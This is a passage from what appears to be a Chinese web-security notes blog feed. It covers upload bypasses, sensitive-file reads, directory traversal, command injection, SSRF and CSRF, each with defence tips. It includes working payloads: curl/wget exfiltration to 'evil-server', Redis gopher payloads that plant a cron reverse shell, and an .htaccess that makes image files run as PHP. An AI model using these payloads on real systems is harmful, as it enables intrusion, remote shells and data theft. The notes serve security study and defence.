/  <code>exe</code>  /  <code>dll</code>  /  <code>com</code>  /  <code>bat</code>  /  <code>pl</code>  /  <code>cfc</code>  /  <code>cfm</code>  /  <code>ini</code>  等。</p>\n<h2 id=\"系统命名绕过\"><a class=\"anchor\" href=\"#系统命名绕过\">#</a> 系统命名绕过</h2>\n<p>在 Windows 系统中，上传  <code>index.php.</code>  会重命名为  <code>.</code>  ，可以绕过后缀检查。 也可尝试  <code>index.php%20</code>  ，  <code>index.php:1.jpg</code>   <code>index.php::$DATA</code>  等。 在 Linux 系统中，可以尝试上传名为  <code>index.php/.</code>  或  <code>./aa/../index.php/.</code>  的文件</p>\n<h2 id=\"userini\"><a class=\"anchor\" href=\"#userini\">#</a> .user.ini</h2>\n<p>在 php 执行的过程中，除了主  <code>php.ini</code>  之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（$_SERVER ['DOCUMENT_ROOT'] 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。  <code>.user.ini</code>  中可以定义除了 PHP_INI_SYSTEM 以外的模式的选项，故可以使用  <code>.user.ini</code>  加上非 php 后缀的文件构造一个 shell，比如  <code>auto_prepend_file=01.gif</code>  。</p>\n<h2 id=\"waf绕过\"><a class=\"anchor\" href=\"#waf绕过\">#</a> WAF 绕过</h2>\n<p>有的 waf 在编写过程中考虑到性能原因，只处理一部分数据，这时可以通过加入大量垃圾数据来绕过其处理函数。</p>\n<p>另外，Waf 和 Web 系统对  <code>boundary</code>  的处理不一致，可以使用错误的  <code>boundary</code>  来完成绕过。</p>\n<h2 id=\"竞争上传绕过\"><a class=\"anchor\" href=\"#竞争上传绕过\">#</a> 竞争上传绕过</h2>\n<p>有的服务器采用了先保存，再删除不合法文件的方式，在这种服务器中，可以反复上传一个会生成 Web Shell 的文件并尝试访问，多次之后即可获得 Shell。</p>\n<h1 id=\"攻击技巧\"><a class=\"anchor\" href=\"#攻击技巧\">#</a> 攻击技巧</h1>\n<h2 id=\"apache重写getshell\"><a class=\"anchor\" href=\"#apache重写getshell\">#</a> Apache 重写 GetShell</h2>\n<p>Apache 可根据是否允许重定向考虑上传.htaccess</p>\n<p>内容为</p>\n<pre><code>AddType application/x-httpd-php .png\nphp_flag engine 1\n</code></pre>\n<p>就可以用 png 或者其他后缀的文件做 php 脚本了</p>\n<h2 id=\"软链接任意读文件\"><a class=\"anchor\" href=\"#软链接任意读文件\">#</a> 软链接任意读文件</h2>\n<p>上传的压缩包文件会被解压的文件时，可以考虑上传含符号链接的文件 若服务器没有做好防护，可实现任意文件读取的效果</p>\n<h1 id=\"防护技巧\"><a class=\"anchor\" href=\"#防护技巧\">#</a> 防护技巧</h1>\n<ul>\n<li>使用白名单限制上传文件的类型</li>\n<li>使用更严格的文件类型检查方式</li>\n<li>限制 Web Server 对上传文件夹的解析</li>\n</ul>\n<h1 id=\"参考链接\"><a class=\"anchor\" href=\"#参考链接\">#</a> 参考链接</h1>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzE4ODQ2NC5odG1s\">构造优质上传漏洞 Fuzz 字典</span></li>\n</ul>\n",
            "tags": [
                "目录",
                "上传"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/readfile/",
            "url": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/readfile/",
            "title": "文件读取",
            "date_published": "2022-11-26T12:49:44.000Z",
            "content_html": "<p>考虑读取可能有敏感信息的文件</p>\n<ul>\n<li>用户目录下的敏感文件\n<ul>\n<li>.bash_history</li>\n<li>.zsh_history</li>\n<li>.profile</li>\n<li>.bashrc</li>\n<li>.gitconfig</li>\n<li>.viminfopasswd</li>\n</ul>\n</li>\n<li>应用的配置文件\n<ul>\n<li>/etc/apache2/apache2.conf</li>\n<li>/etc/nginx/nginx.conf</li>\n</ul>\n</li>\n<li>应用的日志文件\n<ul>\n<li>/var/log/apache2/access.log</li>\n<li>/var/log/nginx/access.log</li>\n</ul>\n</li>\n<li>站点目录下的敏感文件\n<ul>\n<li>.svn/entries</li>\n<li>.git/HEAD</li>\n<li>WEB-INF/web.xml</li>\n<li>.htaccess</li>\n</ul>\n</li>\n<li>特殊的备份文件\n<ul>\n<li>.swp</li>\n<li>.swo</li>\n<li>.bak</li>\n<li>index.php~</li>\n<li>...</li>\n</ul>\n</li>\n<li>Python 的 Cache\n<ul>\n<li><code>__pycache__\\__init__.cpython-35.pyc</code></li>\n</ul>\n</li>\n</ul>\n",
            "tags": [
                "目录",
                "读取"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/directory%20traversal/",
            "url": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/directory%20traversal/",
            "title": "目录穿越",
            "date_published": "2022-11-26T12:44:44.000Z",
            "content_html": "<h1 id=\"简介\"><a class=\"anchor\" href=\"#简介\">#</a> 简介</h1>\n<p>目录穿越（也被称为目录遍历 /directory traversal/path traversal）是通过使用  <code>../</code>  等目录控制序列或者文件的绝对路径来访问存储在文件系统上的任意文件和目录，特别是应用程序源代码、配置文件、重要的系统文件等。</p>\n<h1 id=\"攻击载荷\"><a class=\"anchor\" href=\"#攻击载荷\">#</a> 攻击载荷</h1>\n<h2 id=\"url参数\"><a class=\"anchor\" href=\"#url参数\">#</a> URL 参数</h2>\n<ul>\n<li><code>../</code></li>\n<li><code>..\\</code></li>\n<li><code>..;/</code></li>\n</ul>\n<h2 id=\"nginx-off-by-slash\"><a class=\"anchor\" href=\"#nginx-off-by-slash\">#</a> Nginx Off by Slash</h2>\n<ul>\n<li><code>https://vuln.site.com/files../</code></li>\n</ul>\n<h2 id=\"unc-bypass\"><a class=\"anchor\" href=\"#unc-bypass\">#</a> UNC Bypass</h2>\n<ul>\n<li><code>\\\\localhost\\c$\\windows\\win.ini</code></li>\n</ul>\n<h1 id=\"过滤绕过\"><a class=\"anchor\" href=\"#过滤绕过\">#</a> 过滤绕过</h1>\n<ul>\n<li>\n<p>单次替换</p>\n<ul>\n<li><code>...//</code></li>\n</ul>\n</li>\n<li>\n<p>URL 编码</p>\n</li>\n<li>\n<p>16 位 Unicode 编码</p>\n<ul>\n<li><code>\\u002e</code></li>\n</ul>\n</li>\n<li>\n<p>超长 UTF-8 编码</p>\n<ul>\n<li><code>\\%e0%40%ae</code></li>\n</ul>\n</li>\n</ul>\n<h1 id=\"防御\"><a class=\"anchor\" href=\"#防御\">#</a> 防御</h1>\n<p>在进行文件操作相关的 API 前，应该对用户输入做过滤。较强的规则下可以使用白名单，仅允许纯字母或数字字符等。</p>\n<p>若规则允许的字符较多，最好使用当前操作系统路径规范化函数规范化路径后，进行过滤，最后再进行相关调用。</p>\n<h1 id=\"参考链接\"><a class=\"anchor\" href=\"#参考链接\">#</a> 参考链接</h1>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L2ZpbGUtcGF0aC10cmF2ZXJzYWw=\">Directory traversal by portswigger</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9QYXRoX1RyYXZlcnNhbA==\">Path Traversal by OWASP</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9ncy5tc2RuLm1pY3Jvc29mdC5jb20vamVyZW15a3VobmUvMjAxNi8wNC8yMS9wYXRoLW5vcm1hbGl6YXRpb24v\">path normalization</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmJsYWNraGF0LmNvbS91cy0xOC9XZWQtQXVndXN0LTgvdXMtMTgtT3JhbmdlLVRzYWktQnJlYWtpbmctUGFyc2VyLUxvZ2ljLVRha2UtWW91ci1QYXRoLU5vcm1hbGl6YXRpb24tT2ZmLUFuZC1Qb3AtMGRheXMtT3V0LTIucGRm\">Breaking Parser Logic: Take Your Path Normalization Off and Pop 0days Out defcon</span></li>\n</ul>\n",
            "tags": [
                "绕过",
                "遍历"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/command%20insert/",
            "url": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/command%20insert/",
            "title": "命令注入",
            "date_published": "2022-11-26T09:30:44.000Z",
            "content_html": "<h1 id=\"简介\"><a class=\"anchor\" href=\"#简介\">#</a> 简介</h1>\n<p>命令注入通常因为指 Web 应用在服务器上拼接系统命令而造成的漏洞。</p>\n<p>该类漏洞通常出现在调用外部程序完成一些功能的情景下。比如一些 Web 管理界面的配置主机名 / IP / 掩码 / 网关、查看系统信息以及关闭重启等功能，或者一些站点提供如 ping、nslookup、提供发送邮件、转换图片等功能都可能出现该类漏洞。</p>\n<h1 id=\"常见危险函数\"><a class=\"anchor\" href=\"#常见危险函数\">#</a> 常见危险函数</h1>\n<h2 id=\"php\"><a class=\"anchor\" href=\"#php\">#</a> PHP</h2>\n<ul>\n<li>system</li>\n<li>exec</li>\n<li>passthru</li>\n<li>shell_exec</li>\n<li>popen</li>\n<li>proc_open</li>\n</ul>\n<h2 id=\"python\"><a class=\"anchor\" href=\"#python\">#</a> Python</h2>\n<ul>\n<li>system</li>\n<li>popen</li>\n<li>subprocess.call</li>\n<li>spawn</li>\n</ul>\n<h2 id=\"java\"><a class=\"anchor\" href=\"#java\">#</a> Java</h2>\n<ul>\n<li>java.lang.Runtime.getRuntime().exec(command)</li>\n</ul>\n<h1 id=\"常见注入方式\"><a class=\"anchor\" href=\"#常见注入方式\">#</a> 常见注入方式</h1>\n<ul>\n<li>分号分割</li>\n<li><code>||</code>   <code>&amp;&amp;</code>   <code>&amp;</code>  分割</li>\n<li><code>|</code>  管道符</li>\n<li><code>\\r\\n</code>   <code>%d0%a0</code>  换行</li>\n<li>反引号解析</li>\n<li><code>$()</code>  替换</li>\n</ul>\n<h1 id=\"无回显技巧\"><a class=\"anchor\" href=\"#无回显技巧\">#</a> 无回显技巧</h1>\n<ul>\n<li>\n<p>bash 反弹 shell</p>\n</li>\n<li>\n<p>DNS 带外数据</p>\n</li>\n<li>\n<p>http 带外</p>\n<ul>\n<li><code>curl http://evil-server/$(whoami)</code></li>\n<li><code>wget http://evil-server/$(whoami)</code></li>\n</ul>\n</li>\n<li>\n<p>无带外时利用  <code>sleep</code>  或其他逻辑构造布尔条件</p>\n</li>\n</ul>\n<h1 id=\"常见绕过方式\"><a class=\"anchor\" href=\"#常见绕过方式\">#</a> 常见绕过方式</h1>\n<h2 id=\"空格绕过\"><a class=\"anchor\" href=\"#空格绕过\">#</a> 空格绕过</h2>\n<ul>\n<li><code>&lt;</code>  符号  <code>cat&lt;123</code></li>\n<li><code>\\t</code>  /  <code>%09</code></li>\n<li><code>$&#123;IFS&#125;</code>   其中 {} 用来截断，比如 <code>cat$IFS2</code>  会被认为 IFS2 是变量名。另外，在后面加个 $ 可以起到截断的作用，一般用 $9，因为 $9 是当前系统 shell 进程的第九个参数的持有者，它始终为空字符串</li>\n</ul>\n<h2 id=\"黑名单绕过\"><a class=\"anchor\" href=\"#黑名单绕过\">#</a> 黑名单绕过</h2>\n<ul>\n<li><code>a=l;b=s;$a$b</code></li>\n<li>base64  <code>echo &quot;bHM=&quot; | base64 -d</code></li>\n<li><code>/?in/?s</code>  =&gt;  <code>/bin/ls</code></li>\n<li>连接符  <code>cat /etc/pass'w'd</code></li>\n<li>未定义的初始化变量  <code>cat$x /etc/passwd</code></li>\n</ul>\n<h2 id=\"长度限制绕过\"><a class=\"anchor\" href=\"#长度限制绕过\">#</a> 长度限制绕过</h2>\n<pre><code>&gt;wget\\\n&gt;foo.\\\n&gt;com\nls -t&gt;a\nsh a\n</code></pre>\n<p>上面的方法为通过命令行重定向写入命令，接着通过 ls 按时间排序把命令写入文件，最后执行 直接在 Linux 终端下执行的话，创建文件需要在重定向符号之前添加命令 这里可以使用一些诸如 w,[之类的短命令，(使用 ls /usr/bin/? 查看) 如果不添加命令，需要 Ctrl+D 才能结束，这样就等于标准输入流的重定向 而在 php 中，使用 shell_exec 等执行系统命令的函数的时候，是不存在标准输入流的，所以可以直接创建文件</p>\n<h1 id=\"常用符号\"><a class=\"anchor\" href=\"#常用符号\">#</a> 常用符号</h1>\n<h2 id=\"命令分隔符\"><a class=\"anchor\" href=\"#命令分隔符\">#</a> 命令分隔符</h2>\n<ul>\n<li><code>%0a</code>  /  <code>%0d</code>  /  <code>\\n</code>  /  <code>\\r</code></li>\n<li><code>;</code></li>\n<li><code>&amp;</code>  /  <code>&amp;&amp;</code></li>\n</ul>\n<h2 id=\"通配符\"><a class=\"anchor\" href=\"#通配符\">#</a> 通配符</h2>\n<ul>\n<li><code>*</code>  0 到无穷个任意字符</li>\n<li><code>?</code>  一个任意字符</li>\n<li><code>[ ]</code>  一个在括号内的字符，e.g.  <code>[abcd]</code></li>\n<li><code>[ - ]</code>  在编码顺序内的所有字符</li>\n<li><code>[^ ]</code>  一个不在括号内的字符</li>\n</ul>\n<h1 id=\"防御\"><a class=\"anchor\" href=\"#防御\">#</a> 防御</h1>\n<ul>\n<li>\n<p>不使用时禁用相应函数</p>\n</li>\n<li>\n<p>尽量不要执行外部的应用程序或命令</p>\n</li>\n<li>\n<p>做输入的格式检查</p>\n</li>\n<li>\n<p>转义命令中的所有 shell 元字符</p>\n<ul>\n<li>shell 元字符包括  <code>#&amp;;`,|*?~&lt;&gt;^()[]&#123;&#125;$\\</code></li>\n</ul>\n</li>\n</ul>\n",
            "tags": [
                "注入",
                "函数",
                "绕过"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/SSRF/",
            "url": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/SSRF/",
            "title": "SSRF",
            "date_published": "2022-11-26T08:59:44.000Z",
            "content_html": "<h1 id=\"简介\"><a class=\"anchor\" href=\"#简介\">#</a> 简介</h1>\n<p>服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。SSRF 攻击通常针对外部网络无法直接访问的内部系统。</p>\n<h2 id=\"漏洞危害\"><a class=\"anchor\" href=\"#漏洞危害\">#</a> 漏洞危害</h2>\n<p>SSRF 可以对外网、服务器所在内网、本地进行端口扫描，攻击运行在内网或本地的应用，或者利用 File 协议读取本地文件。</p>\n<p>内网服务防御相对外网服务来说一般会较弱，甚至部分内网服务为了运维方便并没有对内网的访问设置权限验证，所以存在 SSRF 时，通常会造成较大的危害。</p>\n<h1 id=\"利用方式\"><a class=\"anchor\" href=\"#利用方式\">#</a> 利用方式</h1>\n<p>SSRF 利用存在多种形式以及不同的场景，针对不同场景可以使用不同的利用和绕过方式。</p>\n<p>以 curl 为例，可以使用 dict 协议操作 Redis、file 协议读文件、gopher 协议反弹 Shell 等功能，常见的 Payload 如下：</p>\n<pre><code>curl -vvv 'dict://127.0.0.1:6379/info'\n\ncurl -vvv 'file:///etc/passwd'\n\n# * 注意: 链接使用单引号，避免$变量问题\n\ncurl -vvv 'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/103.21.140.84/6789 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a'\n</code></pre>\n<h1 id=\"相关危险函数\"><a class=\"anchor\" href=\"#相关危险函数\">#</a> 相关危险函数</h1>\n<p>SSRF 涉及到的危险函数主要是网络访问，支持伪协议的网络读取。以 PHP 为例，涉及到的函数有  <code>file_get_contents()</code>  /  <code>fsockopen()</code>  /  <code>curl_exec()</code>  等。</p>\n<h1 id=\"过滤绕过\"><a class=\"anchor\" href=\"#过滤绕过\">#</a> 过滤绕过</h1>\n<h2 id=\"更改ip地址写法\"><a class=\"anchor\" href=\"#更改ip地址写法\">#</a> 更改 IP 地址写法</h2>\n<p>一些开发者会通过对传过来的 URL 参数进行正则匹配的方式来过滤掉内网 IP，如采用如下正则表达式：</p>\n<ul>\n<li><code>^10(\\.([2][0-4]\\d|[2][5][0-5]|[01]?\\d?\\d))&#123;3&#125;$</code></li>\n<li><code>^172\\.([1][6-9]|[2]\\d|3[01])(\\.([2][0-4]\\d|[2][5][0-5]|[01]?\\d?\\d))&#123;2&#125;$</code></li>\n<li><code>^192\\.168(\\.([2][0-4]\\d|[2][5][0-5]|[01]?\\d?\\d))&#123;2&#125;$</code></li>\n</ul>\n<p>对于这种过滤我们采用改编 IP 的写法的方式进行绕过，例如 192.168.0.1 这个 IP 地址可以被改写成：</p>\n<ul>\n<li>8 进制格式：0300.0250.0.1</li>\n<li>16 进制格式：0xC0.0xA8.0.1</li>\n<li>10 进制整数格式：3232235521</li>\n<li>16 进制整数格式：0xC0A80001</li>\n<li>合并后两位：1.1.278 / 1.1.755</li>\n<li>合并后三位：1.278 / 1.755 / 3.14159267</li>\n</ul>\n<p>另外 IP 中的每一位，各个进制可以混用。</p>\n<p>访问改写后的 IP 地址时，Apache 会报 400 Bad Request，但 Nginx、MySQL 等其他服务仍能正常工作。</p>\n<p>另外，0.0.0.0 这个 IP 可以直接访问到本地，也通常被正则过滤遗漏。</p>\n<h2 id=\"使用解析到内网的域名\"><a class=\"anchor\" href=\"#使用解析到内网的域名\">#</a> 使用解析到内网的域名</h2>\n<p>如果服务端没有先解析 IP 再过滤内网地址，我们就可以使用 localhost 等解析到内网的域名。</p>\n<p>另外  <code>xip.io</code>  提供了一个方便的服务，这个网站的子域名会解析到对应的 IP，<span class=\"exturl\" data-url=\"aHR0cDovL3huLS0xOTItdWMwZXA5NmIuMTY4LjAuMS54aXAuaW8=\">例如 192.168.0.1.xip.io</span>，解析到 192.168.0.1。</p>\n<h2 id=\"利用解析url所出现的问题\"><a class=\"anchor\" href=\"#利用解析url所出现的问题\">#</a> 利用解析 URL 所出现的问题</h2>\n<p>在某些情况下，后端程序可能会对访问的 URL 进行解析，对解析出来的 host 地址进行过滤。这时候可能会出现对 URL 参数解析不当，导致可以绕过过滤。</p>\n<p>比如  <code>http://www.baidu.com@192.168.0.1/</code>  当后端程序通过不正确的正则表达式（比如将 http 之后到 com 为止的字符内容，<span class=\"exturl\" data-url=\"aHR0cDovL3huLS13d3cta2Q5ZHc1NGRzOW4uYmFpZHUuY29t\">也就是 www.baidu.com</span>，认为是访问请求的 host 地址时）对上述 URL 的内容进行解析的时候，<span class=\"exturl\" data-url=\"aHR0cDovL3huLS1VUkxob3N0d3d3LXh4MnBoYTcxMGExdHpvNjRiZ2R6YWM5OGN3bnlib2s0YnFwYTY5N28uYmFpZHUuY29t\">很有可能会认为访问 URL 的 host 为 www.baidu.com</span>，而实际上这个 URL 所请求的内容都是 192.168.0.1 上的内容。</p>\n<h2 id=\"利用跳转\"><a class=\"anchor\" href=\"#利用跳转\">#</a> 利用跳转</h2>\n<p>如果后端服务器在接收到参数后，正确的解析了 URL 的 host，并且进行了过滤，我们这个时候可以使用跳转的方式来进行绕过。</p>\n<p>可以使用如 <span class=\"exturl\" data-url=\"aHR0cDovL2h0dHBiaW4ub3JnL3JlZGlyZWN0LXRvP3VybD1odHRwOi8vMTkyLjE2OC4wLjE=\">http://httpbin.org/redirect-to?url=http://192.168.0.1</span> 等服务跳转，但是由于 URL 中包含了 192.168.0.1 这种内网 IP 地址，可能会被正则表达式过滤掉，可以通过短地址的方式来绕过。</p>\n<p>常用的跳转有 302 跳转和 307 跳转，区别在于 307 跳转会转发 POST 请求中的数据等，但是 302 跳转不会。</p>\n<h2 id=\"通过各种非http协议\"><a class=\"anchor\" href=\"#通过各种非http协议\">#</a> 通过各种非 HTTP 协议</h2>\n<p>如果服务器端程序对访问 URL 所采用的协议进行验证的话，可以通过非 HTTP 协议来进行利用。</p>\n<p>比如通过 gopher，可以在一个 url 参数中构造 POST 或者 GET 请求，从而达到攻击内网应用的目的。例如可以使用 gopher 协议对与内网的 Redis 服务进行攻击，可以使用如下的 URL：</p>\n<pre><code>gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1* * * * bash -i &gt;&amp; /dev/tcp/172.19.23.228/23330&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a\n</code></pre>\n<p>除了 gopher 协议，File 协议也是 SSRF 中常用的协议，该协议主要用于访问本地计算机中的文件，我们可以通过类似  <code>file:///path/to/file</code>  这种格式来访问计算机本地文件。使用 file 协议可以避免服务端程序对于所访问的 IP 进行的过滤。例如我们可以通过  <code>file:///d:/1.txt</code>  来访问 D 盘中 1.txt 的内容。</p>\n<h2 id=\"dns-rebinding\"><a class=\"anchor\" href=\"#dns-rebinding\">#</a> DNS Rebinding</h2>\n<p>一个常用的防护思路是：对于用户请求的 URL 参数，首先服务器端会对其进行 DNS 解析，然后对于 DNS 服务器返回的 IP 地址进行判断，如果在黑名单中，就禁止该次请求。</p>\n<p>但是在整个过程中，第一次去请求 DNS 服务进行域名解析到第二次服务端去请求 URL 之间存在一个时间差，利用这个时间差，可以进行 DNS 重绑定攻击。</p>\n<p>要完成 DNS 重绑定攻击，我们需要一个域名，并且将这个域名的解析指定到我们自己的 DNS Server，在我们的可控的 DNS Server 上编写解析服务，设置 TTL 时间为 0。这样就可以进行攻击了，完整的攻击流程为：</p>\n<ul>\n<li>服务器端获得 URL 参数，进行第一次 DNS 解析，获得了一个非内网的 IP</li>\n<li>对于获得的 IP 进行判断，发现为非黑名单 IP，则通过验证</li>\n<li>服务器端对于 URL 进行访问，由于 DNS 服务器设置的 TTL 为 0，所以再次进行 DNS 解析，这一次 DNS 服务器返回的是内网地址。</li>\n<li>由于已经绕过验证，所以服务器端返回访问内网资源的结果。</li>\n</ul>\n<h2 id=\"利用ipv6\"><a class=\"anchor\" href=\"#利用ipv6\">#</a> 利用 IPv6</h2>\n<p>有些服务没有考虑 IPv6 的情况，但是内网又支持 IPv6，则可以使用 IPv6 的本地 IP 如  <code>[::]</code>   <code>0000::1</code>  或 IPv6 的内网域名来绕过过滤。</p>\n<h2 id=\"利用idn\"><a class=\"anchor\" href=\"#利用idn\">#</a> 利用 IDN</h2>\n<p>一些网络访问工具如 Curl 等是支持国际化域名（Internationalized Domain Name，IDN）的，国际化域名又称特殊字符域名，是指部分或完全使用特殊的文字或字母组成的互联网域名。</p>\n<p>在这些字符中，部分字符会在访问时做一个等价转换，例如  <code>ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ</code>  和  <code>example.com</code>  等同。利用这种方式，可以用  <code>① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩</code>  等字符绕过内网限制。</p>\n<h1 id=\"可能的利用点\"><a class=\"anchor\" href=\"#可能的利用点\">#</a> 可能的利用点</h1>\n<h2 id=\"内网服务\"><a class=\"anchor\" href=\"#内网服务\">#</a> 内网服务</h2>\n<ul>\n<li>Apache Hadoop 远程命令执行</li>\n<li>axis2-admin 部署 Server 命令执行</li>\n<li>Confluence SSRF</li>\n<li>counchdb WEB API 远程命令执行</li>\n<li>dict</li>\n<li>docker API 远程命令执行</li>\n<li>Elasticsearch 引擎 Groovy 脚本命令执行</li>\n<li>ftp /ftps（FTP 爆破）</li>\n<li>glassfish 任意文件读取和 war 文件部署间接命令执行</li>\n<li>gopher</li>\n<li>HFS 远程命令执行</li>\n<li>http、https</li>\n<li>imap/imaps/pop3/pop3s/smtp/smtps（爆破邮件用户名密码）</li>\n<li>Java 调试接口命令执行</li>\n<li>JBOSS 远程 Invoker war 命令执行</li>\n<li>Jenkins Scripts 接口命令执行</li>\n<li>ldap</li>\n<li>mongodb</li>\n<li>php_fpm/fastcgi 命令执行</li>\n<li>rtsp - smb/smbs（连接 SMB）</li>\n<li>sftp</li>\n<li>ShellShock 命令执行</li>\n<li>Struts2 命令执行</li>\n<li>telnet</li>\n<li>tftp（UDP 协议扩展）</li>\n<li>tomcat 命令执行</li>\n<li>WebDav PUT 上传任意文件</li>\n<li>WebSphere Admin 可部署 war 间接命令执行</li>\n<li>zentoPMS 远程命令执行</li>\n</ul>\n<h2 id=\"redis利用\"><a class=\"anchor\" href=\"#redis利用\">#</a> Redis 利用</h2>\n<ul>\n<li>写 ssh 公钥</li>\n<li>写 crontab</li>\n<li>写 WebShell</li>\n<li>Windows 写启动项</li>\n<li>主从复制加载 .so 文件</li>\n<li>主从复制写无损文件</li>\n</ul>\n<h2 id=\"云主机\"><a class=\"anchor\" href=\"#云主机\">#</a> 云主机</h2>\n<p>在 AWS、Google 等云环境下，通过访问云环境的元数据 API 或管理 API，在部分情况下可以实现敏感信息等效果。</p>\n<h1 id=\"防御方式\"><a class=\"anchor\" href=\"#防御方式\">#</a> 防御方式</h1>\n<ul>\n<li>过滤返回的信息</li>\n<li>统一错误信息</li>\n<li>限制请求的端口</li>\n<li>禁止不常用的协议</li>\n<li>对 DNS Rebinding，考虑使用 DNS 缓存或者 Host 白名单</li>\n</ul>\n<h1 id=\"参考链接\"><a class=\"anchor\" href=\"#参考链接\">#</a> 参考链接</h1>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy45MXJpLm9yZy8xNzExMS5odG1s\">SSRF 漏洞分析与利用</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmxhY2toYXQuY29tL2RvY3MvdXMtMTcvdGh1cnNkYXkvdXMtMTctVHNhaS1BLU5ldy1FcmEtT2YtU1NSRi1FeHBsb2l0aW5nLVVSTC1QYXJzZXItSW4tVHJlbmRpbmctUHJvZ3JhbW1pbmctTGFuZ3VhZ2VzLnBkZg==\">A New Era Of SSRF</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL3NlY2p1aWNlL3BocC1zc3JmLXRlY2huaXF1ZXMtOWQ0MjJjYjI4ZDUx\">php ssrf technique</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUFlUSE9OL2RlZmVuZC1zc3JmLXZ1bG5lcmFibGUtaW4tcHl0aG9uLmh0bWw=\">谈一谈如何在 Python 开发中拒绝 SSRF 漏洞</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2cuc2FmZWJ1ZmYuY29tLzIwMTYvMDcvMDMvU1NSRi1UaXBzLw==\">SSRF Tips</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9qb3ljaG91Lm9yZy93ZWIvcGhwc3NyZi5odG1s\">SSRF in PHP</span></li>\n</ul>\n",
            "tags": [
                "网络安全",
                "漏洞",
                "SSRF"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/CSRF/",
            "url": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/CSRF/",
            "title": "CSRF",
            "date_published": "2022-11-26T08:58:44.000Z",
            "content_html": "<h1 id=\"简介\"><a class=\"anchor\" href=\"#简介\">#</a> 简介</h1>\n<p>跨站请求伪造 (Cross-Site Request Forgery, CSRF)，也被称为 One Click Attack 或者 Session Riding ，通常缩写为 CSRF，是一种对网站的恶意利用。尽管听起来像 XSS，但它与 XSS 非常不同，XSS 利用站点内的信任用户，而 CSRF 则通过伪装来自受信任用户的请求来利用受信任的网站。</p>\n<h1 id=\"分类\"><a class=\"anchor\" href=\"#分类\">#</a> 分类</h1>\n<h2 id=\"资源包含\"><a class=\"anchor\" href=\"#资源包含\">#</a> 资源包含</h2>\n<p>资源包含是在大多数介绍 CSRF 概念的演示或基础课程中可能看到的类型。这种类型归结为控制 HTML 标签（例如 &lt;image&gt;、&lt;audio&gt;、&lt;video&gt;、&lt;object&gt;、&lt;script &gt; 等）所包含的资源的攻击者。如果攻击者能够影响 URL 被加载的话，包含远程资源的任何标签都可以完成攻击。</p>\n<p>由于缺少对 Cookie 的源点检查，如上所述，此攻击不需要 XSS，可以由任何攻击者控制的站点或站点本身执行。此类型仅限于 GET 请求，因为这些是浏览器对资源 URL 唯一的请求类型。这种类型的主要限制是它需要错误地使用安全的 HTTP 请求方式。</p>\n<h2 id=\"基于表单\"><a class=\"anchor\" href=\"#基于表单\">#</a> 基于表单</h2>\n<p>通常在正确使用安全的请求方式时看到。攻击者创建一个想要受害者提交的表单；其包含一个 JavaScript 片段，强制受害者的浏览器提交。</p>\n<p>该表单可以完全由隐藏的元素组成，以致受害者很难发现它。</p>\n<p>如果处理 cookies 不当，攻击者可以在任何站点上发动攻击，只要受害者使用有效的 cookie 